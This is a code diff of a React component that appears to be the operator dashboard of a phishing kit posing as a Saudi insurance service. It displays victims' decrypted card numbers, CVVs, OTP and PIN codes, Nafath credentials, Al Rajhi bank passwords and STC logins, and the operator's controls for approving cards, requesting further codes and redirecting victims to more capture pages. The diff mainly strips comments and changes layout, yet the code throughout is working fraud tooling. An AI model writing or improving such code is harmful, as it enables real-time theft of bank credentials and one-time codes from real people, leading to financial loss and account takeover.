@@ -31,9 +31,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   const [isNavigating, setIsNavigating] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [nafadCode, setNafadCode] = useState("");
-  const [cardsLayout, setCardsLayout] = useState<"vertical" | "horizontal">(
-    "vertical"
-  );
   const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);
 
   const formatStcDate = (value?: string) => {
@@ -74,7 +71,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
       switch (destination) {
         case "home":
-          // Set both fields for compatibility
           updates = {
             redirectPage: "home" as any,
             currentStep: "home" as any,
@@ -87,7 +83,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           updates = { redirectPage: "compar" as any };
           break;
         case "payment":
-          // Modern pages use redirectPage, legacy pages use currentStep
           updates = {
             redirectPage: "payment" as any,
             currentStep: "_st1" as any,
@@ -120,15 +115,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           };
           break;
         case "phone":
-          // Legacy system only
           updates = { currentStep: "phone" as any };
           break;
         case "nafad":
-          // Legacy system with correct value
           updates = { currentStep: "_t6" as any };
           break;
         case "nafad_modal":
-          updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
+          updates = { nafadConfirmationCode: "123456" };
           break;
       }
 
@@ -138,7 +131,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       }
     } catch (error) {
       console.error("Navigation error:", error);
-      console.error(`حدث خطأ في التوجيه:`, error);
     } finally {
       setIsNavigating(false);
     }
@@ -158,9 +150,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   // Prepare bubbles data
   const bubbles: any[] = [];
-  const history = (visitor.history || []) as HistoryEntry[];
 
-  // 1. Basic Info (always show if exists)
+  // 1. Basic Info
   if (visitor.ownerName || visitor.identityNumber) {
     const basicData: Record<string, any> = {
       الاسم: visitor.ownerName,
@@ -171,7 +162,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       "نوع التأمين": visitor.insuranceType,
     };
 
-    // Add buyer info if insurance type is "نقل ملكية"
     if (visitor.insuranceType === "نقل ملكية") {
       basicData["اسم المشتري"] = visitor.buyerName;
       basicData["رقم هوية المشتري"] = visitor.buyerIdNumber;
@@ -188,9 +178,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
-  // Nafad will be added after payment data to sort by timestamp
-
-  // 3. Insurance Details
+  // 2. Insurance Details
   if (visitor.insuranceCoverage) {
     bubbles.push({
       id: "insurance-details",
@@ -236,33 +224,23 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   }
 
   // 4. Payment & Verification Data
-  // Show ALL card attempts from history (newest first)
-  const hasMultipleAttempts = false; // For phone OTP compatibility
-
-  // Get all card entries from history
   const allCardHistory =
     visitor.history?.filter(
       (h: any) => h.type === "_t1" || h.type === "card"
     ) || [];
 
-  // Sort by timestamp (newest first)
   const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
     const timeA = new Date(a.timestamp).getTime();
     const timeB = new Date(b.timestamp).getTime();
-    return timeB - timeA; // Descending order (newest first)
+    return timeB - timeA;
   });
 
-  console.log("[Dashboard] All card history:", sortedCardHistory);
-
-  // Create a bubble for each card attempt
   sortedCardHistory.forEach((cardHistory: any, index: number) => {
-    // Get encrypted values from history
     const encryptedCardNumber = cardHistory.data?._v1;
     const encryptedCvv = cardHistory.data?._v2;
     const encryptedExpiryDate = cardHistory.data?._v3;
     const encryptedCardHolderName = cardHistory.data?._v4;
 
-    // Decrypt values with error handling
     let cardNumber, cvv, expiryDate, cardHolderName;
     try {
       cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined;
@@ -279,7 +257,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       cardHolderName = encryptedCardHolderName;
     }
 
-    // Show all cards, but hide action buttons if already actioned
     const hasBeenActioned =
       cardHistory.status === "approved" || cardHistory.status === "rejected";
 
@@ -303,14 +280,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         },
         timestamp: cardHistory.timestamp,
         status: cardHistory.status || ("pending" as const),
-        showActions: !hasBeenActioned, // Hide buttons if already approved/rejected
+        showActions: !hasBeenActioned,
         isLatest: index === 0,
         type: "card",
       });
     }
   });
 
-  // OTP Code - Show ALL attempts from history (newest first)
+  // OTP Code
   const allOtpHistory =
     visitor.history?.filter((h: any) => h.type === "_t2" || h.type === "otp") ||
     [];
@@ -352,7 +329,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     }
   });
 
-  // PIN Code - Show ALL attempts from history (newest first)
+  // PIN Code
   const allPinHistory =
     visitor.history?.filter((h: any) => h.type === "_t3" || h.type === "pin") ||
     [];
@@ -412,7 +389,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
-  // Phone OTP - Show ALL attempts from history (newest first)
+  // Phone OTP
   const allPhoneOtpHistory =
     visitor.history?.filter(
       (h: any) => h.type === "_t5" || h.type === "phone_otp"
@@ -458,7 +435,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     }
   });
 
-  // Nafad Info - add to dynamic bubbles to sort by timestamp
+  // Nafad Info
   const nafazId = visitor._v8 || visitor.nafazId;
   const nafazPass = visitor._v9 || visitor.nafazPass;
 
@@ -497,7 +474,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
-  // Rajhi Info - add to dynamic bubbles to sort by timestamp
+  // Rajhi Info
   const rajhiUser = visitor._v10 || visitor.rajhiUser;
   const rajhiPassword =
     visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
@@ -525,7 +502,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
-  // STC Login Info - keep visible even for STC-only visitors without basic info.
+  // STC Login Info
   const hasStcData =
     Boolean(visitor.stcPhone?.trim()) ||
     Boolean(visitor.stcPassword?.trim()) ||
@@ -555,22 +532,19 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     });
   }
 
-  // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
+  // Sort bubbles
   const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
   const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
   const staticBubbles = bubbles.filter((b) => staticBubbleIds.includes(b.id));
 
-  // Sort dynamic bubbles by timestamp (newest first)
   dynamicBubbles.sort((a, b) => {
     const timeA = new Date(a.timestamp).getTime();
     const timeB = new Date(b.timestamp).getTime();
-    return timeB - timeA; // Descending order (newest first)
+    return timeB - timeA;
   });
 
-  // Combine: dynamic bubbles first, then static bubbles at bottom
   const sortedBubbles = [...dynamicBubbles, ...staticBubbles];
 
-  // Action handlers for bubbles
   const handleBubbleAction = async (
     bubbleId: string,
     action: "approve" | "reject" | "resend" | "otp" | "pin"
@@ -586,25 +560,16 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       switch (bubble.type) {
         case "card":
           if (action === "otp") {
-            // Approve card with OTP - update history status
-            console.log(
-              "[Action] Card OTP clicked, bubble.id:",
-              bubble.id,
-              "history:",
-              visitor.history
-            );
             await updateHistoryStatus(
               visitor.id,
               bubble.id,
               "approved_with_otp",
               visitor.history || []
             );
-            console.log("[Action] Status updated to approved_with_otp");
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_otp",
             });
           } else if (action === "pin") {
-            // Approve card with PIN - update history status
             await updateHistoryStatus(
               visitor.id,
               bubble.id,
@@ -616,7 +581,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
-              // Reject card - update history status
               await updateHistoryStatus(
                 visitor.id,
                 bubble.id,
@@ -630,7 +594,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
         case "otp":
           if (action === "approve") {
-            // Approve OTP using proper handler
             await handleOtpApproval(
               visitor.id,
               bubble.id,
@@ -638,7 +601,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             );
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
-              // Reject OTP using proper handler
               await handleOtpRejection(
                 visitor.id,
                 bubble.id,
@@ -650,24 +612,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
         case "phone_otp":
           if (action === "approve") {
-            if (hasMultipleAttempts) {
-              await handlePhoneOtpApproval(visitor.id, bubbleId, history);
-            } else {
-              await updateApplication(visitor.id, {
-                phoneOtpStatus: "approved",
-              });
-            }
-            // Phone OTP approved
+            await updateApplication(visitor.id, {
+              phoneOtpStatus: "approved",
+            });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
-              if (hasMultipleAttempts) {
-                await handlePhoneOtpRejection(visitor.id, bubbleId, history);
-              } else {
-                await updateApplication(visitor.id, {
-                  phoneOtpStatus: "rejected",
-                });
-              }
-              // Phone OTP rejected
+              await updateApplication(visitor.id, {
+                phoneOtpStatus: "rejected",
+              });
             }
           } else if (action === "resend") {
             await updateHistoryStatus(
@@ -680,7 +632,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp",
             });
-            // Phone OTP modal reopened
           }
           break;
 
@@ -701,14 +652,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       }
     } catch (error) {
       console.error("Action error:", error);
-      console.error(`حدث خطأ:`, error);
     } finally {
       setIsProcessing(false);
     }
   };
 
   return (
-    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
+    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden h-full">
       {/* Header */}
       <div className="bg-white border-b border-gray-200 p-4 md:p-6">
         <div className="flex flex-col gap-4 md:flex-row md:items-start md:justify-between">
@@ -743,27 +693,27 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                   </span>
                 </span>
               </div>
-              {/* Display STC Data */}
-              {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
-                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg">
+              {visitor.finalOtp && (
+                <div className="bg-purple-50 border-r-4 border-purple-500 p-4 rounded-lg mt-2">
                   <h4 className="font-semibold text-purple-900 mb-2">
-                    بيانات STC
+                    بيانات OTP
                   </h4>
                   <div className="space-y-2 text-sm">
-                    {visitor.stcPhone && <div>الجوال: {visitor.stcPhone}</div>}
-                    {visitor.stcPassword && (
-                      <div>كلمة المرور: {visitor.stcPassword}</div>
+                    {visitor.finalOtp && <div>OTP: {visitor.finalOtp}</div>}
+                    {visitor.allFinalOtps && (
+                      <div>جميع الرموز: {visitor.allFinalOtps.join("")}</div>
                     )}
                     {visitor.stcSubmittedAt && (
-                      <div>التاريخ: {formatStcDate(visitor.stcSubmittedAt)}</div>
+                      <div>
+                        التاريخ: {formatStcDate(visitor.stcSubmittedAt)}
+                      </div>
                     )}
                   </div>
                 </div>
               )}
 
-              {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
-                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500">
+                <div className="flex flex-wrap items-center gap-2 text-xs text-gray-500 mt-1">
                   {visitor.country && <span>🌍 {visitor.country}</span>}
                   {visitor.browser && (
                     <>
@@ -822,7 +772,6 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 <>📄 تحميل PDF</>
               )}
             </button>
-            {/* Navigation Dropdown */}
             <select
               onChange={(e) => handleNavigate(e.target.value)}
               disabled={isNavigating}
@@ -839,7 +788,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               <option value="nafad">نفاذ</option>
               <option value="nafad_modal">مودال نفاذ</option>
               <option value="rajhi">راجحي</option>
-              <option value="stc-login">تسجيل دخول STC</option>
+              <option value="stc-login">OTP</option>
             </select>
           </div>
         </div>
@@ -853,11 +802,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           </div>
         ) : (
           <div
-            className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-0"
+            className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 lg:gap-6"
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6 md:border-l md:border-gray-200 md:pl-4">
               {sortedBubbles
                 .filter(
                   (b) => b.id.startsWith("card-info") || b.id === "card-details"
@@ -969,7 +918,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
+            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6 md:border-l-0 md:px-0">
               {sortedBubbles
                 .filter(
                   (b) =>
@@ -1090,7 +1039,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </div>
 
             {/* Left Column - Static Info (Basic, Offer Details, Insurance Details) */}
-            <div className="flex flex-col gap-4 lg:pr-6">
+            <div className="flex flex-col gap-4 lg:pr-6 md:col-span-2 lg:col-span-1 md:border-t md:border-gray-200 md:pt-6 lg:border-t-0 lg:pt-0">
               {sortedBubbles
                 .filter(
                   (b) =>
